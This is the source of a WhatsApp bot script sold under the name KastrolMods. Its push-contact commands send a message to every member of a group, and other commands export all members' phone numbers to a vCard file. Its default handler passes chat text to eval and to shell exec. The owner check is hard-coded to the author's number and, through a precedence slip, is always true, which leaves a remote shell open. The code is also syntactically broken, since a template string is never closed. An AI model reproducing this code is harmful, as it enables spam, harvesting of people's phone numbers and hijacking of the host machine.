/*
  SC By KastrolMods
  𝗠𝗔𝗨 𝗡𝗢 𝗘𝗡𝗖 𝗙𝗨𝗟𝗟 ?
  wa me/+62 831-3367-6962
  𝗛𝗔𝗥𝗚𝗔 𝗕𝗜𝗦𝗜𝗞²


*/
require('./config')
const {
	delay,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const util = require('util')
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const {
    smsg,
    sleep,
    runtime,
    getBuffer,
    jsonformat,
    format,
    parseMention,
    getGroupAdmins
} = require('./db/function')


module.exports = chilo = async (chilo, m, chatUpdate, store) => { try {
var body = (m.mtype === 'conversation') ? m.message.conversation: (m.mtype == 'imageMessage') ? m.message.imageMessage.caption: (m.mtype == 'videoMessage') ? m.message.videoMessage.caption: (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text: (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId: (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId: (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId: (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text): ''
var budy = (typeof m.text == 'string' ? m.text: '')
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botId = await chilo.decodeJid(chilo.user.id)
const botNumber = botId.split('@')[0]
const ownId = ownNumb.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
const ownNumber = ownNumb.replace(/[^0-9]/g, '')
const dtext = args.join(" ")
const quoted = m.quoted ? m.quoted: m
const groupMetadata = m.isGroup ? await chilo.groupMetadata(m.chat).catch(e => {}): ''
const groupName = m.isGroup ? groupMetadata.subject: ''
const participants = m.isGroup ? await groupMetadata.participants: ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants): ''
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender): false
const isBotGroupAdmins = m.isGroup ? groupAdmins.includes(botId): false
const isAuthor = '6283133676962'+'@s.whatsapp.net'.includes(m.sender)
const isOwner = ownId.includes(m.sender) || isAuthor
const isMe = botId.includes(m.sender)

const reply = (teks) => { 
chilo.sendMessage(m.chat, { text : teks, contextInfo: { forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}

const ownSc = `6283133676962`
const ownScName = `𝐊𝐚𝐬𝐭𝐫𝐨𝐥𝐌𝐨𝐝𝐬`

if (command) {
	console.log()
	console.log(`${m.isGroup ? '\x1b[0;32mFOX\x1b[1;32m-host' : '\x1b[1;32mFOX-host'} \x1b[0m[ \x1b[1;37m${command} \x1b[0m] at \x1b[0;32m${calender}\x1b[0m\n› ${m.chat}\n› FROM :\x1b[0;37m${m.sender.split('@')[0]}\x1b[0m${m.pushName ? ', '+m.pushName : ''}\n› IN :\x1b[0;32m${m.isGroup ? groupName : ' chat private'}\x1b[0m`)
	chilo.readMessages([m.key])
}
switch (command) {

case 'menu': case 'help': {
const owned = `${ownSc}@s.whatsapp.net`
let menu = `𝐒𝐂 𝐏𝐔𝐒𝐇𝐊𝐎𝐍𝐓𝐀𝐊 𝐒𝐈𝐌𝐏𝐄𝐋 - 𝐊𝐚𝐬𝐭𝐫𝐨𝐥𝐌𝐨𝐝𝐬V1

⠀⠀╭╮╱▔▔▔▔▔╲╭╮┃HO
⠀⠀╰╱╭▅╮⠀╭▅╮╲╯┃LA!
⠀⠀⠀▏╰╱▔▇▔╲╯▕⠀┻━━
╱╲⠀▏⠀▏⠀┃⠀▕⠀▕⠀╱╲⠀
▏⠀╲╲⠀╲╰┻╯╱⠀╱╱⠀▕⠀
╲⠀⠀╲╲⠀▔▔▔⠀╱╱⠀⠀╱⠀
⠀╲⠀⠀▔▕╲▂╱▏▔⠀⠀╱⠀⠀
⠀⠀╲⠀⠀▕╱▔╲▏⠀⠀╱ 


╱╱▏┈┈╱╱╱╱▏╱╱▏
▇╱▏┈┈▇▇▇╱▏▇╱▏
▇╱▏▁┈▇╱▇╱▏▇╱▏▁
▇╱╱╱▏▇╱▇╱▏▇╱╱╱
▇▇▇╱┈▇▇▇╱┈▇▇▇╱  




┌⁠──────────
○ 𝐍𝐚𝐦𝐚 𝐁𝐨𝐭 : 𝐊𝐚𝐬𝐭𝐫𝐨𝐥𝐌𝐨𝐝𝐬V1 
○ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : V1
○ 𝐍𝐚𝐦𝐚 𝐎𝐰𝐧𝐞𝐫 : ${ownName}
○ 𝐍𝐮𝐦𝐛𝐞𝐫 𝐎𝐰𝐧𝐞𝐫 : ${ownNumb}
○ 𝐑𝐮𝐧𝐓𝐢𝐦𝐞 : ${runtime(process.uptime())}
└──────────

𝐌𝐎𝐃𝐄 𝐏𝐔𝐒𝐇 𝐊𝐎𝐍𝐓𝐀𝐊 凸
⌯ cekid
⌯ cekid2
⌯ cekmember
⌯ pushkon
⌯ pushkonGroup
⌯ savekontak

 𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔
⌯ public
⌯ self
⌯ getkontak
⌯ sendkontak
⌯ sendkontakTod
⌯ owner
⌯ ownersc
⌯ sc
⌯ informasi
⌯ tutorpushkon

☍ #SCRIPT 𝐊𝐚𝐬𝐭𝐫𝐨𝐥𝐌𝐨𝐝𝐬V1 6283133676962
${runtime(process.uptime())}

*©6283133676962 ${ownName}*`
chilo.sendMessage(m.chat, { image: thumb, caption: menu, contextInfo: { mentionedJid: [owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break // (?); daftar menu


case "self":{
chilo.public = false
reply('*SELEB MODE*')
}
break

case "public":{
chilo.public = true
reply('*FRIENDLY MODE*')
}
break

case 'script': case 'sc': // hargai penerbit!
let soScript = `𝗠𝗔𝗨 𝗦𝗖𝗥𝗜𝗣𝗧 ?
BISA DI CEK DI GC / SOSMED SAYA YA KA

𝗢𝗪𝗡𝗘𝗥 : ${ownSc}

*BUY SC PM*


*6283133676962*
Chat


reply(soScript)
break // (?); bot script

case 'runtime': case 'test':
reply(runtime(process.uptime()))
break // (?); runtime bot

case "informasi": case "info":
if (!isOwner) return reply('khusus own')
if (!dtext) return reply(mess.inf)
break
case "tutorpush":
let menunya = `𝗧𝗨𝗧𝗢𝗥 CIL ⚠️
 › lakukan perintah sesuai yg ada di menu
 › beda command bot gakan respon jadi  
   utamakan ketelitian
 › misal kalian mau cek id group
   Silahkan ketik .listgc
 › mau push ? Ketikan
  .pushkon atau .pushkonv2
   setelah itu ikuti intruksi yg di berikan oleh
   bot
 › masih bingun ? 
   chat own ketikan .ownersc
`
reply(menunya)
break
case 'ownersc':
let ownnContact = {
	displayName: "Contact", contacts: [{displayName: ownScName, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+ownScName+";;;\nFN:"+ownScName+"\nitem1.TEL;waid="+ownSc+":"+ownSc+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); kontak owner
let sooContact = await chilo.sendMessage(m.chat, {contacts: ownnContact},{quoted: m})
chilo.sendMessage(m.chat, {text: `*ITU KA OWNER SCNYA*\n*MAU BUY NO ENC ? CHAT AJA*`}, {quoted: sooContact})
break
case 'owner': case 'botowner':
let ownContact = {
	displayName: "Contact", contacts: [{displayName: ownName, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+ownName+";;;\nFN:"+ownName+"\nitem1.TEL;waid="+ownNumber+":"+ownNumber+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); kontak owner
let soContact = await chilo.sendMessage(m.chat, {contacts: ownContact}, {quoted: m})
setTimeout(() => {chilo.sendMessage(m.chat, {delete: soContact.key})}, 20000)
break

case 'getcontact': case 'getkontak':
if (!m.isGroup) return reply(mess.group)
if (!(isGroupAdmins || isOwner)) return reply('Khusus Admin')
huhuhs = await chilo.sendMessage(m.chat, {
    text: `*GROUP :* ${groupMetadata.subject}\n*MEMBER :* ${participants.length}`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
chilo.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break

case 'savekontak': case 'svkontak':
if (!m.isGroup) return reply(mess.group)
if (!(isGroupAdmins || isOwner)) return reply('admin_only')
let cmiggc = await chilo.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('Mengimpor '+cmiggc.participants.length+' kontak..')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
chilo.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'Group: *'+cmiggc.subject+'*\nParticipants total: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break

case 'sendkontak': case 'kontak':
if (!m.isGroup) return reply(mess.group)
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let snTak = dtext.split(' ')[1] ? dtext.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
chilo.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break

case 'sendkontag': case 'kontag':
if (!m.isGroup) return reply(mess.group)
if (!(isGroupAdmins || isOwner)) return reply('khusus admin')
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let sngTak = dtext.split(' ')[1] ? dtext.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak - hidetag
chilo.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
break

case 'cekid':
if (!isOwner) return reply(mess.owner)
await reply('*wait sedang mengambil data....*')
let getGroups = await chilo.groupFetchAllParticipating()
let gclish = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let gclist = gclish.map(v => v.id)
if (gclist.length > 2000) return reply(jsonformat(gclist))
let gctext = `𝗗𝗔𝗙𝗧𝗔𝗥 𝗚𝗖 𝗔𝗡𝗗𝗔\n*total :* ${gclist.length} GC`
for (let a of gclist) {
	let mdata = await chilo.groupMetadata(a)
	gctext += `\n\n*☍ NAME GC :* ${mdata.subject}\n*☍ MEMBER :* ${mdata.participants.length}\n*☍ ID :* ${mdata.id}`
} // (?); daftar chat grup
reply(gctext)
break

case "cekid2": {
if (!isOwner) return khususOwner()
reply(`*wait sedang mengambil data....*`)
let getGroups = await chilo.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let tekss = `𝗧𝗢𝗧𝗔𝗟 𝗚𝗥𝗢𝗨𝗣 : ${anu.length} Group\n\n`
for (let xnxx of anu) {
tekss += `${xnxx}\n`
}
reply(tekss + `\n𝗡𝗼𝘁𝗲 :\nKalo mau cek member ketik\n.cekmember idgc \nsalin terlebih dahulu idgc di atas`)
}
break

case "cekmember": {
if (!isOwner) return khususOwner()
if (!dtext) return reply("Id Nya Mana Kak?")
let cekmd = await chilo.groupMetadata(dtext)
let txrk = await chilo.sendMessage(m.chat, { text: `*Nama Group :* ${cekmd.subject}\n*Member :* ${cekmd.participants.length} Orang` }, { quoted: m})
await chilo.sendMessage(m.chat, { text: `*Kalo mau push ketik ke gni*\n.pushkon2 120363144535686704@g.us|halo meks save KastrolMods` }, { quoted: txrk })
}
break

case 'pushkon':
if (!isOwner) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!dtext) return reply('*SALAH DECK TUTOR NYA GINI*\n\n.pushkontak teksnya')
	let pkDetect = await chilo.groupMetadata(m.chat)
	if (pkDetect.participants.length > 2000) return reply(mess.maksimal)
	reply('*proses send ke* '+pkDetect.participants.length+' *kontak..*')
	for (let a of pkDetect.participants) {
	chilo.sendMessage(a.id, {text: dtext})
	await sleep(mess.delay) // SET JEDANYA DI SINI
} // (?); kirim pesan ke semua peserta grup
reply('*Selesai*')
break

case 'pushkon2':
if (!isOwner) return reply(mess.owner)
	let phkid = dtext.split('|')[0]
	let phktxt = dtext.split('|')[1]
if (!phkid) return reply('*SALAH DECK TUTOR NYA GINI*\n\n.pushkon2 ID|teksnya')
if (!phktxt) return reply('*SALAH DECK TUTOR NYA GINI*\n\n.pushkon2 ID|teksnya')
	let pk2Detect = await chilo.groupMetadata(phkid)
	if (pk2Detect.participants.length > 2000) return reply(mess.maksimal)
	reply('*proses send ke* '+pk2Detect.participants.length+' *kontak..*')
	for (let a of pk2Detect.participants) {
	chilo.sendMessage(a.id, {text: phktxt})
	await sleep(mess.delay) // SET JEDA NYA DI SINI
} // (?); kirim pesan ke semua peserta grup (id)
reply('*Selesai*')
break


default:

if (budy.startsWith('>')) {
    if (!isOwner) return
    try {
        let evaled = await eval(budy.slice(2))
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
        await reply(evaled)
    } catch (err) {
        await reply(String(err))
    }
}

if (budy.startsWith('$')) {
    if (!isOwner) return
    exec(budy.slice(2), (err, stdout) => {
        if (err) return reply(`${err}`)
        if (stdout) return reply(stdout)
    })
}
}
	} catch (err) {
		chilo.sendMessage(ownNumb.replace(/[^0-9]/g, '')+'@s.whatsapp.net', {text: util.format(err)}, {ephemeralExpiration: 86400, quoted: m})
		console.log('\x1b[1;31m'+err+'\x1b[0m')
	}
}


let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
	require('fs').unwatchFile(file)
	console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
	delete require.cache[file]
	require(file)
})